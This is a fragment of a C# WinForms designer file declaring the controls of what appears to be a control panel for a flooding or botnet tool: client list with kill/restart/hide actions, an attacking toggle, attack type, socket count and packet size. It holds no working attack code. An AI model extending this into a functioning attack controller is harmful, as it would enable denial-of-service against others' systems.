            this.DisplayHeader = false;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "MainPanel";
            this.Padding = new System.Windows.Forms.Padding(20, 30, 20, 20);
            this.Resizable = false;
            this.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.ShadowType = MetroFramework.Forms.MetroFormShadowType.AeroShadow;
            this.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MainPanel_FormClosing);
            this.metroPanel3.ResumeLayout(false);
            this.metroPanel1.ResumeLayout(false);
            this.logContextMenu.ResumeLayout(false);
            this.clientContextMenu.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion
        private MetroFramework.Controls.MetroPanel metroPanel1;
        private MetroFramework.Controls.MetroLabel metroLabel1;
        private MetroFramework.Controls.MetroListView logListView;
        private System.Windows.Forms.ColumnHeader logColumn;
        private MetroFramework.Controls.MetroLabel metroLabel2;
        private MetroFramework.Controls.MetroLabel metroLabel3;
        private MetroFramework.Controls.MetroPanel metroPanel3;
        private MetroFramework.Controls.MetroLabel metroLabel4;
        private MetroFramework.Controls.MetroTextBox metroTextBox1;
        private MetroFramework.Controls.MetroListView clientListView;
        private System.Windows.Forms.ColumnHeader clientColumn;
        private MetroFramework.Controls.MetroLabel delayLabel;
        private MetroFramework.Controls.MetroLabel metroLabel8;
        private MetroFramework.Controls.MetroTrackBar delayTrackBar;
        private MetroFramework.Controls.MetroToggle serverToggle;
        private MetroFramework.Controls.MetroLabel metroLabel7;
        private MetroFramework.Controls.MetroTextBox metroTextBox2;
        private MetroFramework.Controls.MetroLabel metroLabel10;
        private MetroFramework.Controls.MetroLabel socketsLabel;
        private MetroFramework.Controls.MetroLabel metroLabel11;
        private MetroFramework.Controls.MetroTrackBar socketsTrackBar;
        private MetroFramework.Controls.MetroToggle attackingToggle;
        private MetroFramework.Controls.MetroLabel metroLabel6;
        private MetroFramework.Controls.MetroButton applySettingsBtn;
        private MetroFramework.Controls.MetroButton restartClientsBtn;
        private MetroFramework.Controls.MetroLabel serverIPV4Label;
        private MetroFramework.Controls.MetroLabel serverIPLabel;
        private MetroFramework.Controls.MetroLabel serverPortLabel;
        private MetroFramework.Controls.MetroContextMenu logContextMenu;
        private System.Windows.Forms.ToolStripMenuItem viewLogMenuItem;
        private MetroFramework.Controls.MetroContextMenu clientContextMenu;
        private System.Windows.Forms.ToolStripMenuItem killToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem restartToolStripMenuItem;
        private MetroFramework.Controls.MetroComboBox attackTypeComboBox;
        private MetroFramework.Controls.MetroLabel metroLabel9;
        private MetroFramework.Controls.MetroLabel packetSizeLabel;
        private MetroFramework.Controls.MetroLabel metroLabel13;
        private MetroFramework.Controls.MetroTrackBar packetSizeTrackBar;
        private MetroFramework.Controls.MetroButton hideClientsBtn;
        private System.Windows.Forms.ToolStripMenuItem hideToolStripMenuItem;
    }
}

